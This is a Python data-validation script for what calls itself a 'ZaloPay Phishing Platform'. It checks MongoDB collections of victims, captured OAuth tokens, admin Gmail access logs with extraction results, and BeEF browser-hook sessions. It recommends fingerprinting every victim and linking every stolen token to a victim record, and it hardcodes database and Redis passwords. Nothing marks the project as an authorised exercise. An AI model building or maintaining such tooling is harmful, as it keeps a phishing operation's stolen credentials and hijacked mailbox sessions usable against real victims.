#!/usr/bin/env python3
"""
Comprehensive Data Validation Suite for ZaloPay Phishing Platform
Validates data integrity, quality, and completeness across all collections
"""

import asyncio
import json
import sys
import os
from datetime import datetime, timedelta
from typing import Dict, List, Any
from motor.motor_asyncio import AsyncIOMotorClient
import redis
from influxdb_client import InfluxDBClient
import re
from collections import Counter

# Add project root to path
sys.path.append('/home/lucian/zalopay_phishing_platform')

from backend.config import settings

class DataValidationSuite:
    def __init__(self):
        self.mongo_client = AsyncIOMotorClient(
            f"mongodb://admin:ZaloPayAdmin2025!@localhost:27017/admin?authSource=admin"
        )
        self.db = self.mongo_client.zalopay_phishing
        self.redis_client = redis.Redis(
            host='localhost', 
            port=6379, 
            password='ZaloPayRedis2025!',
            decode_responses=True
        )
        self.influx_client = InfluxDBClient(
            url="http://localhost:8086",
            token=os.getenv('INFLUX_TOKEN', ''),
            org="zalopay"
        )
        
        self.validation_results = {
            'timestamp': datetime.utcnow().isoformat(),
            'overall_status': 'unknown',
            'collections': {},
            'data_quality_metrics': {},
            'integrity_issues': [],
            'recommendations': []
        }
    
    async def run_comprehensive_validation(self):
        """Run comprehensive data validation across all collections"""
        
        print("🔍 Starting comprehensive data validation...")
        
        # Validate each collection
        collections_to_validate = [
            'victims', 'oauth_tokens', 'admin_users', 'campaigns',
            'activity_logs', 'gmail_access_logs', 'beef_sessions'
        ]
        
        for collection_name in collections_to_validate:
            print(f"📊 Validating {collection_name} collection...")
            self.validation_results['collections'][collection_name] = await self.validate_collection(collection_name)
        
        # Calculate data quality metrics
        self.validation_results['data_quality_metrics'] = await self.calculate_data_quality_metrics()
        
        # Identify integrity issues
        self.validation_results['integrity_issues'] = await self.identify_integrity_issues()
        
        # Generate recommendations
        self.validation_results['recommendations'] = await self.generate_recommendations()
        
        # Calculate overall status
        self.validation_results['overall_status'] = self.calculate_overall_status()
        
        return self.validation_results
    
    async def validate_collection(self, collection_name: str) -> Dict[str, Any]:
        """Validate a specific collection"""
        
        collection = self.db[collection_name]
        total_documents = await collection.count_documents({})
        
        validation_result = {
            'total_documents': total_documents,
            'completeness_score': 0,
            'accuracy_score': 0,
            'consistency_score': 0,
            'validity_score': 0,
            'issues': [],
            'recommendations': []
        }
        
        if total_documents == 0:
            validation_result['issues'].append("Collection is empty")
            return validation_result
        
        # Collection-specific validation
        if collection_name == 'victims':
            validation_result.update(await self.validate_victims_collection(collection))
        elif collection_name == 'oauth_tokens':
            validation_result.update(await self.validate_oauth_tokens_collection(collection))
        elif collection_name == 'admin_users':
            validation_result.update(await self.validate_admin_users_collection(collection))
        elif collection_name == 'campaigns':
            validation_result.update(await self.validate_campaigns_collection(collection))
        elif collection_name == 'activity_logs':
            validation_result.update(await self.validate_activity_logs_collection(collection))
        elif collection_name == 'gmail_access_logs':
            validation_result.update(await self.validate_gmail_access_logs_collection(collection))
        elif collection_name == 'beef_sessions':
            validation_result.update(await self.validate_beef_sessions_collection(collection))
        
        return validation_result
    
    async def validate_victims_collection(self, collection) -> Dict[str, Any]:
        """Validate victims collection"""
        
        issues = []
        recommendations = []
        
        # Check for duplicate emails
        duplicate_emails = await collection.aggregate([
            {'$group': {'_id': '$email', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        if duplicate_emails:
            issues.append(f"Found {len(duplicate_emails)} duplicate emails")
            recommendations.append("Implement email uniqueness constraint")
        
        # Check for missing required fields
        missing_email = await collection.count_documents({'email': {'$exists': False}})
        if missing_email > 0:
            issues.append(f"Found {missing_email} victims without email")
            recommendations.append("Add email validation in data capture process")
        
        # Check for invalid email formats
        invalid_emails = await collection.count_documents({
            'email': {'$not': {'$regex': r'^[^\s@]+@[^\s@]+\.[^\s@]+$'}}
        })
        if invalid_emails > 0:
            issues.append(f"Found {invalid_emails} victims with invalid email format")
            recommendations.append("Implement email format validation")
        
        # Check for missing validation data
        missing_validation = await collection.count_documents({'validation': {'$exists': False}})
        if missing_validation > 0:
            issues.append(f"Found {missing_validation} victims without validation data")
            recommendations.append("Ensure all victims go through validation process")
        
        # Check for missing device fingerprints
        missing_fingerprint = await collection.count_documents({
            'device_fingerprint': {'$exists': False}
        })
        if missing_fingerprint > 0:
            issues.append(f"Found {missing_fingerprint} victims without device fingerprint")
            recommendations.append("Implement device fingerprinting for all victims")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'email': {'$exists': True, '$ne': None},
            'validation': {'$exists': True},
            'device_fingerprint': {'$exists': True},
            'session_data': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_oauth_tokens_collection(self, collection) -> Dict[str, Any]:
        """Validate OAuth tokens collection"""
        
        issues = []
        recommendations = []
        
        # Check for missing victim_id references
        missing_victim_id = await collection.count_documents({'victim_id': {'$exists': False}})
        if missing_victim_id > 0:
            issues.append(f"Found {missing_victim_id} OAuth tokens without victim_id")
            recommendations.append("Ensure all OAuth tokens are linked to victims")
        
        # Check for expired tokens
        expired_tokens = await collection.count_documents({
            'expires_at': {'$lt': datetime.utcnow()}
        })
        if expired_tokens > 0:
            issues.append(f"Found {expired_tokens} expired OAuth tokens")
            recommendations.append("Implement token cleanup process")
        
        # Check for missing token data
        missing_token_data = await collection.count_documents({
            'token_data': {'$exists': False}
        })
        if missing_token_data > 0:
            issues.append(f"Found {missing_token_data} OAuth tokens without token data")
            recommendations.append("Ensure token data is properly stored")
        
        # Check for invalid providers
        invalid_providers = await collection.count_documents({
            'provider': {'$nin': ['google', 'apple', 'facebook', 'microsoft']}
        })
        if invalid_providers > 0:
            issues.append(f"Found {invalid_providers} OAuth tokens with invalid providers")
            recommendations.append("Validate OAuth provider values")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'victim_id': {'$exists': True},
            'provider': {'$exists': True},
            'token_data': {'$exists': True},
            'token_metadata': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_admin_users_collection(self, collection) -> Dict[str, Any]:
        """Validate admin users collection"""
        
        issues = []
        recommendations = []
        
        # Check for duplicate usernames
        duplicate_usernames = await collection.aggregate([
            {'$group': {'_id': '$username', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        if duplicate_usernames:
            issues.append(f"Found {len(duplicate_usernames)} duplicate usernames")
            recommendations.append("Ensure username uniqueness")
        
        # Check for missing passwords
        missing_password = await collection.count_documents({
            'password_hash': {'$exists': False}
        })
        if missing_password > 0:
            issues.append(f"Found {missing_password} admin users without password")
            recommendations.append("Ensure all admin users have passwords")
        
        # Check for weak passwords (basic check)
        weak_passwords = await collection.count_documents({
            'password_hash': {'$regex': r'^\$2b\$12\$'}
        })
        if weak_passwords > 0:
            issues.append(f"Found {weak_passwords} admin users with potentially weak passwords")
            recommendations.append("Implement password strength requirements")
        
        # Check for missing roles
        missing_role = await collection.count_documents({'role': {'$exists': False}})
        if missing_role > 0:
            issues.append(f"Found {missing_role} admin users without role")
            recommendations.append("Assign roles to all admin users")
        
        # Check for inactive users
        inactive_users = await collection.count_documents({'is_active': False})
        if inactive_users > 0:
            issues.append(f"Found {inactive_users} inactive admin users")
            recommendations.append("Review inactive user accounts")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'username': {'$exists': True, '$ne': None},
            'password_hash': {'$exists': True},
            'role': {'$exists': True},
            'is_active': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_campaigns_collection(self, collection) -> Dict[str, Any]:
        """Validate campaigns collection"""
        
        issues = []
        recommendations = []
        
        # Check for duplicate campaign codes
        duplicate_codes = await collection.aggregate([
            {'$group': {'_id': '$code', 'count': {'$sum': 1}}},
            {'$match': {'count': {'$gt': 1}}}
        ]).to_list()
        
        if duplicate_codes:
            issues.append(f"Found {len(duplicate_codes)} duplicate campaign codes")
            recommendations.append("Ensure campaign code uniqueness")
        
        # Check for missing timeline data
        missing_timeline = await collection.count_documents({
            'timeline': {'$exists': False}
        })
        if missing_timeline > 0:
            issues.append(f"Found {missing_timeline} campaigns without timeline")
            recommendations.append("Add timeline data to all campaigns")
        
        # Check for missing statistics
        missing_stats = await collection.count_documents({
            'statistics': {'$exists': False}
        })
        if missing_stats > 0:
            issues.append(f"Found {missing_stats} campaigns without statistics")
            recommendations.append("Initialize statistics for all campaigns")
        
        # Check for invalid status values
        invalid_status = await collection.count_documents({
            'status': {'$nin': ['draft', 'active', 'paused', 'suspended', 'completed', 'archived']}
        })
        if invalid_status > 0:
            issues.append(f"Found {invalid_status} campaigns with invalid status")
            recommendations.append("Validate campaign status values")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'name': {'$exists': True, '$ne': None},
            'code': {'$exists': True, '$ne': None},
            'timeline': {'$exists': True},
            'statistics': {'$exists': True},
            'status': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_activity_logs_collection(self, collection) -> Dict[str, Any]:
        """Validate activity logs collection"""
        
        issues = []
        recommendations = []
        
        # Check for missing timestamps
        missing_timestamp = await collection.count_documents({
            'timestamp': {'$exists': False}
        })
        if missing_timestamp > 0:
            issues.append(f"Found {missing_timestamp} activity logs without timestamp")
            recommendations.append("Ensure all activity logs have timestamps")
        
        # Check for missing actor information
        missing_actor = await collection.count_documents({
            'actor': {'$exists': False}
        })
        if missing_actor > 0:
            issues.append(f"Found {missing_actor} activity logs without actor")
            recommendations.append("Ensure all activity logs have actor information")
        
        # Check for missing action type
        missing_action_type = await collection.count_documents({
            'action_type': {'$exists': False}
        })
        if missing_action_type > 0:
            issues.append(f"Found {missing_action_type} activity logs without action_type")
            recommendations.append("Ensure all activity logs have action_type")
        
        # Check for old logs that should be archived
        old_logs = await collection.count_documents({
            'timestamp': {'$lt': datetime.utcnow() - timedelta(days=730)}  # 2 years
        })
        if old_logs > 0:
            issues.append(f"Found {old_logs} activity logs older than 2 years")
            recommendations.append("Archive old activity logs")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'timestamp': {'$exists': True},
            'actor': {'$exists': True},
            'action_type': {'$exists': True},
            'action_category': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_gmail_access_logs_collection(self, collection) -> Dict[str, Any]:
        """Validate Gmail access logs collection"""
        
        issues = []
        recommendations = []
        
        # Check for missing admin_id
        missing_admin_id = await collection.count_documents({
            'admin_id': {'$exists': False}
        })
        if missing_admin_id > 0:
            issues.append(f"Found {missing_admin_id} Gmail access logs without admin_id")
            recommendations.append("Ensure all Gmail access logs have admin_id")
        
        # Check for missing victim_id
        missing_victim_id = await collection.count_documents({
            'victim_id': {'$exists': False}
        })
        if missing_victim_id > 0:
            issues.append(f"Found {missing_victim_id} Gmail access logs without victim_id")
            recommendations.append("Ensure all Gmail access logs have victim_id")
        
        # Check for missing session data
        missing_session = await collection.count_documents({
            'access_session': {'$exists': False}
        })
        if missing_session > 0:
            issues.append(f"Found {missing_session} Gmail access logs without session data")
            recommendations.append("Ensure all Gmail access logs have session data")
        
        # Check for failed sessions
        failed_sessions = await collection.count_documents({
            'access_session.success': False
        })
        if failed_sessions > 0:
            issues.append(f"Found {failed_sessions} failed Gmail access sessions")
            recommendations.append("Investigate failed Gmail access sessions")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'admin_id': {'$exists': True},
            'victim_id': {'$exists': True},
            'access_session': {'$exists': True},
            'extraction_results': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def validate_beef_sessions_collection(self, collection) -> Dict[str, Any]:
        """Validate BeEF sessions collection"""
        
        issues = []
        recommendations = []
        
        # Check for missing victim_id
        missing_victim_id = await collection.count_documents({
            'victim_id': {'$exists': False}
        })
        if missing_victim_id > 0:
            issues.append(f"Found {missing_victim_id} BeEF sessions without victim_id")
            recommendations.append("Ensure all BeEF sessions have victim_id")
        
        # Check for missing session status
        missing_status = await collection.count_documents({
            'session_status': {'$exists': False}
        })
        if missing_status > 0:
            issues.append(f"Found {missing_status} BeEF sessions without status")
            recommendations.append("Ensure all BeEF sessions have status")
        
        # Check for missing browser info
        missing_browser_info = await collection.count_documents({
            'browser_profile': {'$exists': False}
        })
        if missing_browser_info > 0:
            issues.append(f"Found {missing_browser_info} BeEF sessions without browser info")
            recommendations.append("Ensure all BeEF sessions have browser info")
        
        # Check for expired sessions
        expired_sessions = await collection.count_documents({
            'expires_at': {'$lt': datetime.utcnow()}
        })
        if expired_sessions > 0:
            issues.append(f"Found {expired_sessions} expired BeEF sessions")
            recommendations.append("Clean up expired BeEF sessions")
        
        # Calculate completeness score
        total_docs = await collection.count_documents({})
        complete_docs = await collection.count_documents({
            'victim_id': {'$exists': True},
            'session_status': {'$exists': True},
            'browser_profile': {'$exists': True},
            'commands_executed': {'$exists': True}
        })
        
        completeness_score = complete_docs / total_docs if total_docs > 0 else 0
        
        return {
            'completeness_score': completeness_score,
            'issues': issues,
            'recommendations': recommendations
        }
    
    async def calculate_data_quality_metrics(self) -> Dict[str, Any]:
        """Calculate overall data quality metrics"""
        
        metrics = {
            'overall_completeness': 0,
            'overall_consistency': 0,
            'overall_accuracy': 0,
            'total_documents': 0,
            'collections_with_issues': 0,
            'critical_issues': 0
        }
        
        total_collections = len(self.validation_results['collections'])
        completeness_scores = []
        issues_count = 0
        critical_issues = 0
        
        for collection_name, collection_data in self.validation_results['collections'].items():
            if 'completeness_score' in collection_data:
                completeness_scores.append(collection_data['completeness_score'])
            
            if 'issues' in collection_data:
                issues_count += len(collection_data['issues'])
                if len(collection_data['issues']) > 0:
                    metrics['collections_with_issues'] += 1
                
                # Count critical issues (duplicates, missing required fields)
                for issue in collection_data['issues']:
                    if 'duplicate' in issue.lower() or 'missing' in issue.lower():
                        critical_issues += 1
        
        if completeness_scores:
            metrics['overall_completeness'] = sum(completeness_scores) / len(completeness_scores)
        
        metrics['total_documents'] = sum(
            collection_data.get('total_documents', 0) 
            for collection_data in self.validation_results['collections'].values()
        )
        metrics['critical_issues'] = critical_issues
        
        return metrics
    
    async def identify_integrity_issues(self) -> List[Dict[str, Any]]:
        """Identify data integrity issues across collections"""
        
        integrity_issues = []
        
        # Check for orphaned OAuth tokens
        oauth_tokens = await self.db.oauth_tokens.find({}, {'victim_id': 1}).to_list()
        victim_ids = set(token['victim_id'] for token in oauth_tokens if 'victim_id' in token)
        existing_victims = set()
        
        for victim_id in victim_ids:
            victim = await self.db.victims.find_one({'_id': victim_id})
            if victim:
                existing_victims.add(victim_id)
        
        orphaned_tokens = len(victim_ids - existing_victims)
        if orphaned_tokens > 0:
            integrity_issues.append({
                'type': 'orphaned_oauth_tokens',
                'count': orphaned_tokens,
                'description': f'Found {orphaned_tokens} OAuth tokens without corresponding victims',
                'severity': 'high'
            })
        
        # Check for orphaned Gmail access logs
        gmail_logs = await self.db.gmail_access_logs.find({}, {'victim_id': 1}).to_list()
        gmail_victim_ids = set(log['victim_id'] for log in gmail_logs if 'victim_id' in log)
        orphaned_gmail_logs = len(gmail_victim_ids - existing_victims)
        
        if orphaned_gmail_logs > 0:
            integrity_issues.append({
                'type': 'orphaned_gmail_logs',
                'count': orphaned_gmail_logs,
                'description': f'Found {orphaned_gmail_logs} Gmail access logs without corresponding victims',
                'severity': 'medium'
            })
        
        # Check for orphaned BeEF sessions
        beef_sessions = await self.db.beef_sessions.find({}, {'victim_id': 1}).to_list()
        beef_victim_ids = set(session['victim_id'] for session in beef_sessions if 'victim_id' in session)
        orphaned_beef_sessions = len(beef_victim_ids - existing_victims)
        
        if orphaned_beef_sessions > 0:
            integrity_issues.append({
                'type': 'orphaned_beef_sessions',
                'count': orphaned_beef_sessions,
                'description': f'Found {orphaned_beef_sessions} BeEF sessions without corresponding victims',
                'severity': 'medium'
            })
        
        return integrity_issues
    
    async def generate_recommendations(self) -> List[Dict[str, Any]]:
        """Generate recommendations based on validation results"""
        
        recommendations = []
        
        # Analyze completeness scores
        low_completeness_collections = [
            name for name, data in self.validation_results['collections'].items()
            if data.get('completeness_score', 0) < 0.8
        ]
        
        if low_completeness_collections:
            recommendations.append({
                'type': 'data_completeness',
                'priority': 'high',
                'description': f'Improve data completeness for collections: {", ".join(low_completeness_collections)}',
                'action': 'Implement data validation in capture processes'
            })
        
        # Analyze critical issues
        if self.validation_results['data_quality_metrics']['critical_issues'] > 0:
            recommendations.append({
                'type': 'critical_issues',
                'priority': 'critical',
                'description': f'Address {self.validation_results["data_quality_metrics"]["critical_issues"]} critical data issues',
                'action': 'Review and fix data quality issues immediately'
            })
        
        # Analyze integrity issues
        if self.validation_results['integrity_issues']:
            recommendations.append({
                'type': 'data_integrity',
                'priority': 'high',
                'description': f'Fix {len(self.validation_results["integrity_issues"])} data integrity issues',
                'action': 'Implement referential integrity constraints'
            })
        
        # General recommendations
        recommendations.extend([
            {
                'type': 'monitoring',
                'priority': 'medium',
                'description': 'Implement automated data quality monitoring',
                'action': 'Set up regular data validation checks'
            },
            {
                'type': 'backup',
                'priority': 'high',
                'description': 'Ensure regular database backups',
                'action': 'Schedule automated backup procedures'
            },
            {
                'type': 'documentation',
                'priority': 'low',
                'description': 'Document data validation procedures',
                'action': 'Create data quality documentation'
            }
        ])
        
        return recommendations
    
    def calculate_overall_status(self) -> str:
        """Calculate overall validation status"""
        
        # Check if there are any critical issues
        critical_issues = self.validation_results['data_quality_metrics']['critical_issues']
        if critical_issues > 0:
            return 'critical'
        
        # Check if there are any integrity issues
        if self.validation_results['integrity_issues']:
            return 'warning'
        
        # Check overall completeness
        overall_completeness = self.validation_results['data_quality_metrics']['overall_completeness']
        if overall_completeness < 0.8:
            return 'warning'
        
        return 'healthy'

async def main():
    """Main function to run data validation"""
    
    print("🔍 ZaloPay Phishing Platform - Data Validation Suite")
    print("=" * 60)
    
    validator = DataValidationSuite()
    results = await validator.run_comprehensive_validation()
    
    # Print summary
    print(f"\n📊 Validation Summary:")
    print(f"   Overall Status: {results['overall_status'].upper()}")
    print(f"   Total Documents: {results['data_quality_metrics']['total_documents']:,}")
    print(f"   Overall Completeness: {results['data_quality_metrics']['overall_completeness']:.2%}")
    print(f"   Collections with Issues: {results['data_quality_metrics']['collections_with_issues']}")
    print(f"   Critical Issues: {results['data_quality_metrics']['critical_issues']}")
    
    # Print collection details
    print(f"\n📋 Collection Details:")
    for collection_name, collection_data in results['collections'].items():
        print(f"   {collection_name}:")
        print(f"     Documents: {collection_data['total_documents']:,}")
        print(f"     Completeness: {collection_data.get('completeness_score', 0):.2%}")
        print(f"     Issues: {len(collection_data.get('issues', []))}")
    
    # Print integrity issues
    if results['integrity_issues']:
        print(f"\n⚠️  Integrity Issues:")
        for issue in results['integrity_issues']:
            print(f"   {issue['type']}: {issue['description']} (Severity: {issue['severity']})")
    
    # Print recommendations
    if results['recommendations']:
        print(f"\n💡 Recommendations:")
        for rec in results['recommendations']:
            print(f"   [{rec['priority'].upper()}] {rec['description']}")
            print(f"      Action: {rec['action']}")
    
    # Save results to file
    output_file = f"/opt/zalopay/validation_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n💾 Detailed results saved to: {output_file}")
    
    # Return appropriate exit code
    if results['overall_status'] == 'critical':
        sys.exit(1)
    elif results['overall_status'] == 'warning':
        sys.exit(2)
    else:
        sys.exit(0)

if __name__ == "__main__":
    asyncio.run(main())